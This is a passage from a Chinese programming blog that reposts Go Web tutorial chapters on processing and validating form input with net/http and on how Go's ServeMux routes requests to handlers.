这些信息是输出到服务器端的打印信息</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;path&quot;</span>, r.URL.Path)</span><br><span class="line">    fmt.Println(<span class="string">&quot;scheme&quot;</span>, r.URL.Scheme)</span><br><span class="line">    fmt.Println(r.Form[<span class="string">&quot;url_long&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> r.Form &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;key:&quot;</span>, k)</span><br><span class="line">        fmt.Println(<span class="string">&quot;val:&quot;</span>, strings.Join(v, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Fprintf(w, <span class="string">&quot;Hello astaxie!&quot;</span>) <span class="comment">// 这个写入到 w 的是输出到客户端的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;method:&quot;</span>, r.Method) <span class="comment">// 获取请求的方法</span></span><br><span class="line">    <span class="keyword">if</span> r.Method == <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">        t, _ := template.ParseFiles(<span class="string">&quot;login.gtpl&quot;</span>)</span><br><span class="line">        log.Println(t.Execute(w, <span class="literal">nil</span>))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        err := r.ParseForm()   <span class="comment">// 解析 url 传递的参数，对于 POST 则解析响应包的主体（request body）</span></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">           <span class="comment">// handle error http.Error() for example</span></span><br><span class="line">          log.Fatal(<span class="string">&quot;ParseForm: &quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 请求的是登录数据，那么执行登录的逻辑判断</span></span><br><span class="line">        fmt.Println(<span class="string">&quot;username:&quot;</span>, r.Form[<span class="string">&quot;username&quot;</span>])</span><br><span class="line">        fmt.Println(<span class="string">&quot;password:&quot;</span>, r.Form[<span class="string">&quot;password&quot;</span>])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, sayhelloName)       <span class="comment">// 设置访问的路由</span></span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/login&quot;</span>, login)         <span class="comment">// 设置访问的路由</span></span><br><span class="line">    err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>) <span class="comment">// 设置监听的端口</span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(<span class="string">&quot;ListenAndServe: &quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的代码我们可以看出获取请求方法是通过 r.Method 来完成的，这是个字符串类型的变量，返回 GET, POST, PUT 等 method 信息。</p>
<p>login 函数中我们根据 r.Method 来判断是显示登录界面还是处理登录逻辑。当 GET 方式请求时显示登录界面，其他方式请求时则处理登录逻辑，如查询数据库、验证登录信息等。</p>
<p>我们输入用户名和密码之后发现在服务器端是不会打印出来任何输出的，为什么呢？默认情况下，Handler 里面是不会自动解析 form 的，必须显式的调用 r.ParseForm() 后，你才能对这个表单数据进行操作。我们修改一下代码，在 fmt.Println(“username:”, r.Form[“username”]) 之前加一行 r.ParseForm(), 重新编译，再次测试输入递交，现在是不是在服务器端有输出你的输入的用户名和密码了。</p>
<p>r.Form 里面包含了所有请求的参数，比如 URL 中 query-string、POST 的数据、PUT 的数据，所以当你在 URL 中的 query-string 字段和 POST 冲突时，会保存成一个 slice，里面存储了多个值，Go 官方文档中说在接下来的版本里面将会把 POST、GET 这些数据分离开来。</p>
<p>现在我们修改一下 login.gtpl 里面 form 的 action 值 <a target="_blank" rel="noopener" href="http://127.0.0.1:9090/login">http://127.0.0.1:9090/login</a> 修改为 <a target="_blank" rel="noopener" href="http://127.0.0.1:9090/login?username=astaxie%EF%BC%8C%E5%86%8D%E6%AC%A1%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E8%BE%93%E5%87%BA">http://127.0.0.1:9090/login?username=astaxie，再次测试，服务器的输出</a> username 是不是一个 slice。</p>
<p><code>request.Form</code> 是一个 url.Values 类型，里面存储的是对应的类似 <code>key=value</code> 的信息，下面展示了可以对 form 数据进行的一些操作:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v := url.Values&#123;&#125;</span><br><span class="line">v.Set(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Ava&quot;</span>)</span><br><span class="line">v.Add(<span class="string">&quot;friend&quot;</span>, <span class="string">&quot;Jess&quot;</span>)</span><br><span class="line">v.Add(<span class="string">&quot;friend&quot;</span>, <span class="string">&quot;Sarah&quot;</span>)</span><br><span class="line">v.Add(<span class="string">&quot;friend&quot;</span>, <span class="string">&quot;Zoe&quot;</span>)</span><br><span class="line"><span class="comment">// v.Encode() == &quot;name=Ava&amp;friend=Jess&amp;friend=Sarah&amp;friend=Zoe&quot;</span></span><br><span class="line">fmt.Println(v.Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">fmt.Println(v.Get(<span class="string">&quot;friend&quot;</span>))</span><br><span class="line">fmt.Println(v[<span class="string">&quot;friend&quot;</span>])</span><br></pre></td></tr></table></figure>

<h1 id="验证表单的输入"><a href="#验证表单的输入" class="headerlink" title="验证表单的输入"></a>验证表单的输入</h1><p>我们平常编写 Web 应用主要有两方面的数据验证，一个是在页面端的 js 验证 (目前在这方面有很多的插件库，比如 ValidationJS 插件)，一个是在服务器端的验证，我们这小节讲解的是如何在服务器端验证。</p>
<h2 id="必填字段"><a href="#必填字段" class="headerlink" title="必填字段"></a>必填字段</h2><p>你想要确保从一个表单元素中得到一个值，例如前面小节里面的用户名，我们如何处理呢？Go 有一个内置函数 <code>len</code> 可以获取字符串的长度，这样我们就可以通过 len 来获取数据的长度，例如：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(r.Form[<span class="string">&quot;username&quot;</span>][<span class="number">0</span>])==<span class="number">0</span>&#123;</span><br><span class="line">    <span class="comment">// 为空的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>r.Form 对不同类型的表单元素的留空有不同的处理， 对于空文本框、空文本区域以及文件上传，元素的值为空值，而如果是未选中的复选框和单选按钮，则根本不会在 r.Form 中产生相应条目，如果我们用上面例子中的方式去获取数据时程序就会报错。所以我们需要通过 r.Form.Get() 来获取值，因为如果字段不存在，通过该方式获取的是空值。但是通过 r.Form.Get() 只能获取单个的值，如果是 map 的值，必须通过上面的方式来获取。</p>
<h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p>你想要确保一个表单输入框中获取的只能是数字，例如，你想通过表单获取某个人的具体年龄是 50 岁还是 10 岁，而不是像 “一把年纪了” 或 “年轻着呢” 这种描述</p>
<p>如果我们是判断正整数，那么我们先转化成 int 类型，然后进行处理</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getint,err:=strconv.Atoi(r.Form.Get(<span class="string">&quot;age&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="comment">// 数字转化出错了，那么可能就不是数字</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接下来就可以判断这个数字的大小范围了</span></span><br><span class="line"><span class="keyword">if</span> getint &gt;<span class="number">100</span> &#123;</span><br><span class="line">    <span class="comment">// 太大了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><p>时候我们想通过表单元素获取一个用户的中文名字，但是又为了保证获取的是正确的中文，我们需要进行验证，而不是用户随便的一些输入。对于中文我们目前有两种方式来验证，可以使用 unicode 包提供的 func Is(rangeTab *RangeTable, r rune) bool 来验证，也可以使用正则方式来验证，这里使用最简单的正则方式，如下代码所示</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> m, _ := regexp.MatchString(<span class="string">&quot;^\\p&#123;Han&#125;+$&quot;</span>, r.Form.Get(<span class="string">&quot;realname&quot;</span>)); !m &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="英文"><a href="#英文" class="headerlink" title="英文"></a>英文</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> m, _ := regexp.MatchString(<span class="string">`^([\w\.\_]&#123;2,10&#125;)@(\w&#123;1,&#125;)\.([a-z]&#123;2,4&#125;)$`</span>, r.Form.Get(<span class="string">&quot;email&quot;</span>)); !m &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="手机号码"><a href="#手机号码" class="headerlink" title="手机号码"></a>手机号码</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> m, _ := regexp.MatchString(<span class="string">`^(1[3|4|5|8][0-9]\d&#123;4,8&#125;)$`</span>, r.Form.Get(<span class="string">&quot;mobile&quot;</span>)); !m &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h2><p>如果我们想要判断表单里面 select 元素生成的下拉菜单中是否有被选中的项目。有些时候黑客可能会伪造这个下拉菜单不存在的值发送给你，那么如何判断这个值是否是我们预设的值呢？</p>
<p>我们的 select 可能是这样的一些元素</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fruit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;apple&quot;</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;pear&quot;</span>&gt;</span>pear<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;banana&quot;</span>&gt;</span>banana<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么我们可以这样来验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">slice:=[]string&#123;&quot;apple&quot;,&quot;pear&quot;,&quot;banana&quot;&#125;</span><br><span class="line"></span><br><span class="line">v := r.Form.Get(&quot;fruit&quot;)</span><br><span class="line">for _, item := range slice &#123;</span><br><span class="line">    if item == v &#123;</span><br><span class="line">        return true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return false</span><br></pre></td></tr></table></figure>

<h2 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h2><p>如果我们想要判断 radio 按钮是否有一个被选中了，我们页面的输出可能就是一个男、女性别的选择，但是也可能一个 15 岁大的无聊小孩，一手拿着 http 协议的书，另一只手通过 telnet 客户端向你的程序在发送请求呢，你设定的性别男值是 1，女是 2，他给你发送一个 3，你的程序会出现异常吗？因此我们也需要像下拉菜单的判断方式类似，判断我们获取的值是我们预设的值，而不是额外的值。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>女</span><br></pre></td></tr></table></figure>

<p>那我们也可以类似下拉菜单的做法一样</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">slice:=[]<span class="type">string</span>&#123;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> slice &#123;</span><br><span class="line">    <span class="keyword">if</span> v == r.Form.Get(<span class="string">&quot;gender&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h2 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h2><p>有一项选择兴趣的复选框，你想确定用户选中的和你提供给用户选择的是同一个类型的数据。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;interest&quot;</span> value=<span class="string">&quot;football&quot;</span>&gt;足球</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;interest&quot;</span> value=<span class="string">&quot;basketball&quot;</span>&gt;篮球</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;interest&quot;</span> value=<span class="string">&quot;tennis&quot;</span>&gt;网球</span><br></pre></td></tr></table></figure>

<p>对于复选框我们的验证和单选有点不一样，因为接收到的数据是一个 slice</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">slice:=[]<span class="type">string</span>&#123;<span class="string">&quot;football&quot;</span>,<span class="string">&quot;basketball&quot;</span>,<span class="string">&quot;tennis&quot;</span>&#125;</span><br><span class="line">a:=Slice_diff(r.Form[<span class="string">&quot;interest&quot;</span>],slice)</span><br><span class="line"><span class="keyword">if</span> a == <span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>上面这个函数 <code>Slice_diff</code> 包含在我开源的一个库里面 (操作 slice 和 map 的库)，</p>
<h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><p>你想确定用户填写的日期或时间是否有效。例如<br>，用户在日程表中安排 8 月份的第 45 天开会，或者提供未来的某个时间作为生日。</p>
<p>Go 里面提供了一个 time 的处理包，我们可以把用户的输入年月日转化成相应的时间，然后进行逻辑判断</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t := time.Date(<span class="number">2009</span>, time.November, <span class="number">10</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, time.Local)</span><br><span class="line">fmt.Printf(<span class="string">&quot;Go launched at %s\n&quot;</span>, t.Local())</span><br></pre></td></tr></table></figure>

<p>获取 time 之后我们就可以进行很多时间函数的操作。具体的判断就根据自己的需求调整。</p>
<h2 id="身份证号码"><a href="#身份证号码" class="headerlink" title="身份证号码"></a>身份证号码</h2><p>如果我们想验证表单输入的是否是身份证，通过正则也可以方便的验证，但是身份证有 15 位和 18 位，我们两个都需要验证</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证 15 位身份证，15 位的是全部数字</span></span><br><span class="line"><span class="keyword">if</span> m, _ := regexp.MatchString(<span class="string">`^(\d&#123;15&#125;)$`</span>, r.Form.Get(<span class="string">&quot;usercard&quot;</span>)); !m &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证 18 位身份证，18 位前 17 位为数字，最后一位是校验位，可能为数字或字符 X。</span></span><br><span class="line"><span class="keyword">if</span> m, _ := regexp.MatchString(<span class="string">`^(\d&#123;17&#125;)([0-9]|X)$`</span>, r.Form.Get(<span class="string">&quot;usercard&quot;</span>)); !m &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>转载文章：<a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/041-processing-form-input/3174">04.1. 处理表单的输入 | 第四章. 表单 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/17/7-go%E7%9A%84http%E5%8C%85%E8%AF%A6%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/7-go%E7%9A%84http%E5%8C%85%E8%AF%A6%E8%A7%A3/" class="post-title-link" itemprop="url">7.go的http包详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-17 12:25:58 / 修改时间：12:36:57" itemprop="dateCreated datePublished" datetime="2022-09-17T12:25:58+08:00">2022-09-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Go-的-http-包详解"><a href="#Go-的-http-包详解" class="headerlink" title="Go 的 http 包详解"></a>Go 的 http 包详解</h1><p>Go 的 http 有两个核心功能：Conn、ServeMux</p>
<h2 id="Conn-的-goroutine"><a href="#Conn-的-goroutine" class="headerlink" title="Conn 的 goroutine"></a>Conn 的 goroutine</h2><p>与我们一般编写的 http 服务器不同，Go 为了实现高并发和高性能，使用了 goroutines 来处理 Conn 的读写事件，这样每个请求都能保持独立，相互不会阻塞，可以高效的响应网络事件。这是 Go 高效的保证。</p>
<p>Go 在等待客户端请求里面是这样写的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c, err := srv.newConn(rw)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> c.serve()</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到客户端的每次请求都会创建一个 Conn，这个 Conn 里面保存了该次请求的信息，然后再传递到对应的 handler，该 handler 中便可以读取到相应的 header 信息，这样保证了每个请求的独立性。</p>
<h2 id="ServeMux-的自定义"><a href="#ServeMux-的自定义" class="headerlink" title="ServeMux 的自定义"></a>ServeMux 的自定义</h2><p>我们前面小节讲述 conn.server 的时候，其实内部是调用了 http 包默认的路由器，通过路由器把本次请求的信息传递到了后端的处理函数。那么这个路由器是怎么实现的呢？</p>
<p>它的结构如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ServeMux <span class="keyword">struct</span> &#123;</span><br><span class="line">    mu sync.RWMutex   <span class="comment">// 锁，由于请求涉及到并发处理，因此这里需要一个锁机制</span></span><br><span class="line">    m  <span class="keyword">map</span>[<span class="type">string</span>]muxEntry  <span class="comment">// 路由规则，一个 string 对应一个 mux 实体，这里的 string 就是注册的路由表达式</span></span><br><span class="line">    hosts <span class="type">bool</span> <span class="comment">// 是否在任意的规则中带有 host 信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面看一下 muxEntry</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> muxEntry <span class="keyword">struct</span> &#123;</span><br><span class="line">    explicit <span class="type">bool</span>   <span class="comment">// 是否精确匹配</span></span><br><span class="line">    h        Handler <span class="comment">// 这个路由表达式对应哪个 handler</span></span><br><span class="line">    pattern  <span class="type">string</span>  <span class="comment">// 匹配字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着看一下 Handler 的定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Handler <span class="keyword">interface</span> &#123;</span><br><span class="line">    ServeHTTP(ResponseWriter, *Request)  <span class="comment">// 路由实现器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Handler 是一个接口，但是前一小节中的 sayhelloName 函数并没有实现 ServeHTTP 这个接口，为什么能添加呢？原来在 http 包里面还定义了一个类型 HandlerFunc, 我们定义的函数 sayhelloName 就是这个 HandlerFunc 调用之后的结果，这个类型默认就实现了 ServeHTTP 这个接口，即我们调用了 HandlerFunc (f), 强制类型转换 f 成为 HandlerFunc 类型，这样 f 就拥有了 ServeHTTP 方法。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> HandlerFunc <span class="function"><span class="keyword">func</span><span class="params">(ResponseWriter, *Request)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ServeHTTP calls f(w, r).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f HandlerFunc)</span></span> ServeHTTP(w ResponseWriter, r *Request) &#123;</span><br><span class="line">    f(w, r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>路由器里面存储好了相应的路由规则之后，那么具体的请求又是怎么分发的呢？请看下面的代码，默认的路由器实现了 <code>ServeHTTP</code>：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mux *ServeMux)</span></span> ServeHTTP(w ResponseWriter, r *Request) &#123;</span><br><span class="line">    <span class="keyword">if</span> r.RequestURI == <span class="string">&quot;*&quot;</span> &#123;</span><br><span class="line">        w.Header().Set(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>)</span><br><span class="line">        w.WriteHeader(StatusBadRequest)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    h, _ := mux.Handler(r)</span><br><span class="line">    h.ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上所示路由器接收到请求之后，如果是 * 那么关闭链接，不然调用 mux.Handler(r) 返回对应设置路由的处理 Handler，然后执行 h.ServeHTTP(w, r)</p>
<p>也就是调用对应路由的 handler 的 ServerHTTP 接口，那么 mux.Handler (r) 怎么处理的呢？</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mux *ServeMux)</span></span> Handler(r *Request) (h Handler, pattern <span class="type">string</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> r.Method != <span class="string">&quot;CONNECT&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> p := cleanPath(r.URL.Path); p != r.URL.Path &#123;</span><br><span class="line">            _, pattern = mux.handler(r.Host, p)</span><br><span class="line">            <span class="keyword">return</span> RedirectHandler(p, StatusMovedPermanently), pattern</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> mux.handler(r.Host, r.URL.Path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mux *ServeMux)</span></span> handler(host, path <span class="type">string</span>) (h Handler, pattern <span class="type">string</span>) &#123;</span><br><span class="line">    mux.mu.RLock()</span><br><span class="line">    <span class="keyword">defer</span> mux.mu.RUnlock()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Host-specific pattern takes precedence over generic ones</span></span><br><span class="line">    <span class="keyword">if</span> mux.hosts &#123;</span><br><span class="line">        h, pattern = mux.match(host + path)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> h == <span class="literal">nil</span> &#123;</span><br><span class="line">        h, pattern = mux.match(path)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> h == <span class="literal">nil</span> &#123;</span><br><span class="line">        h, pattern = NotFoundHandler(), <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来他是根据用户请求的 URL 和路由器里面存储的 map 去匹配的，当匹配到之后返回存储的 handler，调用这个 handler 的 ServeHTTP 接口就可以执行到相应的函数了。</p>
